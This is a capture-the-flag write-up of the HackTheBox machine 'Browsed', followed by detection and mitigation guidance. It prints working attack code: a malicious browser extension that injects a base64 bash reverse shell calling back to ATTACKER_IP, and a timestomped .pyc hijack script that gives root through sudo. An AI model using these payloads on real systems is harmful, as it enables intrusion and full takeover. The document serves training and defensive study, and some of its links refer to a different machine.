
# HackTheBox - Browsed (Write-up)

```
Difficulty: Medium  
OS: Linux  
Services: HTTP, SSH, Internal Flask API
```

## Summary of Attack Chain

| Step | User / Access           | Technique Used                                    | Result                                                                                               |
| :--: | :---------------------- | :------------------------------------------------ | :--------------------------------------------------------------------------------------------------- |
|   1  | N/A (Unauthenticated)   | **Network scanning (nmap)**                       | Identified open services `22/tcp` (SSH) and `80/tcp` (HTTP); discovered virtual host `browsed.htb`.  |
|   2  | N/A (Web access)        | **Directory enumeration**                         | Discovered `/upload.php` accepting ZIP files and hints of an internal API.                           |
|   3  | N/A (Web access)        | **Malicious browser extension**                   | Crafted a Chrome extension (`manifest.json`, `content.js`) to target internal `127.0.0.1` resources. |
|   4  | N/A (Admin bot context) | **Cross-Context Scripting (XCS)**                 | Uploaded extension via `/upload.php`; executed within the admin bot’s browser context.               |
|   5  | N/A (Bot context)       | **Command injection (Bash arithmetic expansion)** | Injected `a[$(...)]` payload into internal API endpoint `/routines/`.                                |
|   6  | www-data                | **Reverse shell**                                 | Received callback from the bot host; established initial foothold.                                   |
|   7  | www-data                | **Sudo enumeration**                              | Identified `(root) NOPASSWD: /opt/extensiontool/extension_tool.py`.                                  |
|   8  | www-data                | **File permission analysis**                      | Found writable `__pycache__` directory for the `extension_utils` Python library.                     |
|   9  | www-data                | **Python bytecode hijacking**                     | Replaced legitimate cached module with a malicious compiled `.pyc` file.                             |
|  10  | www-data                | **Timestomping (defense evasion)**                | Matched malicious `.pyc` timestamps to source using `os.utime`, bypassing cache invalidation.        |
|  11  | www-data                | **Privilege escalation (sudo abuse)**             | Executed root-owned script, forcing import of poisoned bytecode.                                     |
|  12  | Root                    | **Flag capture**                                  | Malicious payload ran as root; retrieved **root.txt**.                                               |



## 1. Reconnaissance

### Nmap Scan
Start by scanning the target to identify open ports.

```bash
nmap -sC -sV -oA nmap/browsed <TARGET_IP>

```

[Nmap Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/nmap_results.nmap "Nmap Results")

![Pterodactyl](htb_Pterodactyl_web_landing.png))

**Output:**

* **Port 22:** SSH (OpenSSH)
* **Port 80:** HTTP (Nginx)

### DNS Enumeration

The web server redirects to `browsed.htb`. Add this to your hosts file.

```bash
echo "<TARGET_IP> browsed.htb" | sudo tee -a /etc/hosts

```



## 2. Web Enumeration & Initial Access

### Discovery

Visiting `http://browsed.htb` reveals a website about browser extensions. Navigating to `http://browsed.htb/upload.php` presents a file upload form expecting a zip file containing a browser extension.



### The Vulnerability

The backend likely runs a bot (simulating an admin) that installs and tests uploaded extensions. This bot has access to internal services running on `localhost`.

We suspect an internal service running on `http://127.0.0.1:5000` is vulnerable to **Command Injection** via Bash Arithmetic Expansion in the URL.

**Attack Vector:**

1. Create a malicious Chrome Extension.
2. The extension's JavaScript will force the bot's browser to send a request to `localhost:5000`.
3. The request contains a payload that executes a reverse shell.

### Exploitation Steps

#### Step 1: Create `manifest.json`

This file defines the permissions needed to execute scripts against the internal target.

```json
{
  "manifest_version": 3,
  "name": "PwnExtension",
  "version": "1.0",
  "description": "Exploit",
  "permissions": ["scripting", "activeTab"],
  "host_permissions": ["<all_urls>"],
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["content.js"],
      "run_at": "document_idle"
    }
  ]
}

```

#### Step 2: Create `content.js` (The Payload)

Replace `YOUR_IP` with your tun0 IP address.

```javascript
// Internal vulnerable service
const TARGET = "[http://127.0.0.1:5000/routines/](http://127.0.0.1:5000/routines/)";
const ATTACKER_IP = "10.10.14.X"; 
const ATTACKER_PORT = "4444";

// Reverse shell payload
const cmd = `bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1'`;

// Base64 encode the command
const b64 = btoa(cmd);

// Command Injection: a[$(echo ... | base64 -d | bash)]
// We inject into the array index arithmetic context
const exploit = `a[$(echo ${b64} | base64 -d | bash)]`;

// Send the malicious request
fetch(TARGET + exploit, { mode: "no-cors" });

```

#### Step 3: Bundle and Upload

1. Zip the files:
```bash
zip exploit.zip manifest.json content.js

```

![Browsed](htb_Browsed_Exploit_zip.png)

2. Start a Netcat listener:
```bash
nc -lvnp 4444

```

![Browsed](htb_Browsed_REs.png)


3. Upload `exploit.zip` at `http://browsed.htb/upload.php`.

**Result:** Within a minute, the bot triggers the extension, and you receive a reverse shell as the user `www-data` (or similar).



![Browsed](htb_Browsed_User_flag.png)

## 3. Privilege Escalation

### Enumeration

After stabilizing the shell, check for sudo privileges.

```bash
sudo -l

```

![Browsed](htb_Browsed_sudol.png)

**Output:**

```text
(root) NOPASSWD: /opt/extensiontool/extension_tool.py

```

We can run this Python script as root. Let's inspect the file structure.

* The script imports a module named `extension_utils`.
* Checking permissions: `ls -ld /opt/extensiontool/__pycache__/` shows it is **writable** by our user group.



### The Vulnerability: Python Bytecode Hijacking

Python compiles imported modules into `.pyc` files in `__pycache__`. If the `.pyc` file matches the timestamp and size of the source `.py` file, Python loads the compiled bytecode directly, ignoring the source.

Since we can write to `__pycache__`, we can:

1. Create a malicious version of `extension_utils.py`.
2. Compile it into a `.pyc` file.
3. **Timestomp** it to match the original `extension_utils.py`.
4. Run the main tool with `sudo`, forcing it to load our malicious code as root.

![Browsed](htb_Browsed_py_server.png)

### Exploitation Steps

#### Step 1: Create the Exploit Script

Create a file named `z0n.py` in `/tmp/`.

```python
import os
import py_compile
import shutil
import sys

# Paths
ORIGINAL_SRC = "/opt/extensiontool/extension_utils.py"
MALICIOUS_SRC = "/tmp/extension_utils.py"
# Python 3.12 is likely used based on the machine
TARGET_PYC = "/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc" 

# 1. Get stats of the original file
stat = os.stat(ORIGINAL_SRC)
target_size = stat.st_size

# 2. Craft Payload (Set SUID on bash)
# We define functions that the main script expects to avoid crashing early
payload = 'import os\n'
payload += 'def validate_manifest(path): os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"); return {}\n'
payload += 'def clean_temp_files(arg): pass\n'

# 3. Pad file size to match original EXACTLY
# This is crucial for the "clean" hijack
padding_needed = target_size - len(payload)
payload += "#" * padding_needed

with open(MALICIOUS_SRC, "w") as f:
    f.write(payload)

# 4. Timestomp (Match modification time)
os.utime(MALICIOUS_SRC, (stat.st_atime, stat.st_mtime))

# 5. Compile to .pyc
py_compile.compile(MALICIOUS_SRC, cfile="/tmp/malicious.pyc")

# 6. Inject
print("[+] Injecting malicious bytecode...")
if os.path.exists(TARGET_PYC):
    os.remove(TARGET_PYC)
shutil.copy("/tmp/malicious.pyc", TARGET_PYC)
print("[+] Injection complete.")

```

![Browsed](htb_Browsed_dir_pycache_perm.png)


#### Step 2: Execute

1. Run the exploit script:
```bash
python3 /tmp/z0n.py

```


2. Trigger the vulnerable tool with sudo:
```bash
sudo /opt/extensiontool/extension_tool.py --ext Fontify

```


3. Access Root:
```bash
/tmp/rootbash -p
whoami
# root

```

![Browsed](htb_Browsed_root_flag.png)


# Defensive Operations

## Strategic Overview

* **1.1 Definition:** A multi-stage compromise leveraging a malicious browser extension to bridge the air-gap between external input and internal services (Cross-Context Scripting), followed by a Privilege Escalation via Python Bytecode Hijacking (Time-stomped `.pyc` injection).
* **1.2 Impact:** **Full System Compromise (Root).** The attack chain demonstrates how client-side execution in a privileged context (a bot's browser) can facilitate Remote Code Execution (RCE) on localhost-bound services, leading to unrestricted administrative control.
* **1.3 The Scenario:** An attacker targets an automated "Extension Review" bot. By uploading a malicious extension, the attacker forces the bot's browser to interact with a vulnerable internal API (`127.0.0.1:5000`). Post-compromise, the attacker exploits a misconfiguration in file permissions within a Python application's `__pycache__` directory to inject malicious bytecode, which is subsequently executed by a privileged (sudo) process.



## System Architecture & Theory

* **2.1 Protocol Environment:**
* **Frontend:** PHP (Upload mechanism), Nginx/Apache.
* **Internal Backend:** Python/Flask (Listening on Loopback/Localhost).
* **Browser Context:** Headless Chrome/Chromium with `manifest.json` permissions.
* **Privilege Model:** Linux Sudoers (NOPASSWD execution of Python scripts).


* **2.2 Attack Logic Flow:**
> [Malicious Extension Upload] -> [Bot Execution (Client-Side)] -> [Localhost API Interaction (SSRF/Command Injection)] -> [User Shell (www-data)] -> [**pycache** Injection] -> [Sudo Execution] -> [Root Access]


* **2.3 Theoretical Analogy:**

* **Initial Access:** A "Trojan Horse" entry. The extension is invited inside the fortress (the browser), where it opens a side door (localhost request) that external attackers cannot see.
* **PrivEsc:** "Supply Chain Poisoning." The attacker replaces a pre-assembled engine part (`.pyc`) with a defective one. The mechanic (Root) installs it without checking, assuming it is valid because the manufacture date (timestamp) looks correct.





## The Attack Vector (Mechanics)

### The Core Mechanism

| Attribute                  | Technical Details                                                                                                                                                         |
| :------------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Primary Identifiers**    | **URL Pattern:** `/routines/a[$(...)]`<br><br>**File Path:** `/opt/extensiontool/__pycache__/*.pyc`                                                                       |
| **Critical Vulnerability** | **Initial:** Bash arithmetic expansion injection during URL parsing.<br><br>**PrivEsc:** Writable `__pycache__` combined with Python import precedence.                   |
| **Offensive Action**       | **Web:** Injected base64-encoded bash payload via array index arithmetic.<br><br>**System:** Overwrote compiled bytecode and synchronized `mtime` to evade recompilation. |


### Prerequisites

* **Access Level:** Unauthenticated for Initial Access; Low-privileged user (`www-data` or similar) for PrivEsc.
* **Connectivity:** Target must allow file uploads; Internal service must be active on `127.0.0.1`.
* **Target State:** Sudoers configuration allowing the execution of the target Python script; `__pycache__` directory writable by the compromised user group.



## Threat Hunting & Anomaly Analysis

* **Hunt Hypothesis:**
* **Hypothesis 1 (Web):** Adversaries are bypassing external firewalls by pivoting through the browser. Look for HTTP requests to `localhost` or non-standard ports originating from browser processes, or web server logs showing encoded shell characters (`$`, `(`, `)`) in URL paths.
* **Hypothesis 2 (System):** Adversaries are persisting or escalating via Python library hijacking. Look for file modifications in `__pycache__` directories where the modification time (`mtime`) is identical to the source, but the file hash differs from a known good state.


* **Behavioral Outliers:**
* **Suspicious `utime` calls:** Legitimate processes rarely manually set file timestamps to the past. A script calling `os.utime` on a `.pyc` file is a high-fidelity indicator of "Timestomping."
* **Compiler usage:** The execution of `py_compile` or `compileall` by non-administrative users in production directories is anomalous.


* **Toxic Combinations:**
* **Sudo NOPASSWD** + **Writable Library Paths:** Any script runnable as root that imports libraries from a directory writable by the caller is effectively a root shell.





## Detection Engineering (Blue Team)

* **Telemetry Gap Analysis:**
* **Required:** Web Access Logs (with full URI query strings), Sysmon for Linux (FileCreate, ProcessCreate), Auditd (File Attributes modification).
* **Gap:** Standard access logs might truncate long URLs (masking the base64 payload).


* **Detection-as-Code (KQL):**

```kql
// Detects the specific arithmetic injection pattern in web traffic
let web_attacks = navigate("web_logs")
| where url contains "a[$(" or url contains "base64"
| project Timestamp, SourceIP, Url, StatusCode;

// Detects the PrivEsc: Writing to pycache followed by Sudo execution
let file_writes = navigate("auditd_logs")
| where file_path contains "__pycache__" and action == "write"
| project TimeGenerated, Actor = user_name, File = file_path;

let sudo_execs = navigate("auth_logs")
| where message contains "sudo" and message contains "extension_tool"
| project TimeGenerated, User = user_name, Command = message;

// Correlate: Write to cache -> Sudo Execution within 1 minute
join kind=inner file_writes on $left.Actor == $right.User
| where (sudo_execs.TimeGenerated - file_writes.TimeGenerated) between (0s .. 60s)

```

* **Resilience Test:**
* **Bypass:** Attacker uses a different injection point than `/routines/` or avoids `base64`.
* **Countermeasure:** Implement generic detection for Bash subshell characters (`$()`, ```) in any URL parameter sent to localhost listeners.





## Toolkit & Implementation

* **Automation:**
* **Initial Access:** Custom Chrome Extension (Zip containing `manifest.json`, `content.js`).
* **PrivEsc:** Python script (`os`, `py_compile`, `shutil` modules).


* **OPSEC Analysis:**
* **Covert:** The web exploit is executed *internally* by the bot, meaning the attacker's IP does not directly appear in the internal app's logs (it shows as `127.0.0.1`).
* **Overt:** The PrivEsc leaves a modified `.pyc` file. Forensic hashing of the directory will immediately reveal the tampering despite the timestamp spoofing.


* **Post-Exploitation:**
* Persistence can be achieved by leaving the malicious `.pyc` in place. Every time the admin runs the tool, the payload executes.





## Defensive Mitigation

* **Technical Hardening:**
* **Filesystem Permissions:** Ensure `__pycache__` directories and all source code directories owned by `root` are **not** writable by unprivileged users (e.g., `chmod 755`).
* **Input Validation:** Sanitize all inputs to the internal Flask application. Specifically, block characters associated with shell expansion (`$`, `(`, `)`, `;`, `|`).
* **Sudo Restrictions:** Avoid `NOPASSWD` entries for scripts that rely on dynamically loaded or user-accessible libraries. Use absolute paths and strict permission checks.


* **Personnel Focus:**
* **Code Review:** Audit internal tools for "shell=True" or `os.system` calls using unsanitized input.
* **Supply Chain:** Treat browser extensions as untrusted code; run review bots in isolated, ephemeral containers (Sandboxing) with no access to the host network.





## Quick-Action Playbook

| Step | Objective         | Technical Command / Logic                                                                         |
| :--: | :---------------- | :------------------------------------------------------------------------------------------------ |
|  01  | **Enumerate**     | `nmap -sC -sV`; `gobuster` (discover `/upload.php`); `sudo -l` (identify `extension_tool.py`).    |
|  02  | **Exploit (Web)** | Create `manifest.json` + `content.js` to fetch `127.0.0.1:5000/routines/payload`; ZIP and upload. |
|  03  | **Exploit (Sys)** | `os.stat(src)` → `os.utime(malicious, times)` → `py_compile.compile()` → overwrite target `.pyc`. |
|  04  | **Escalate**      | `sudo /opt/extensiontool/extension_tool.py` → malicious import → **root shell**.                  |
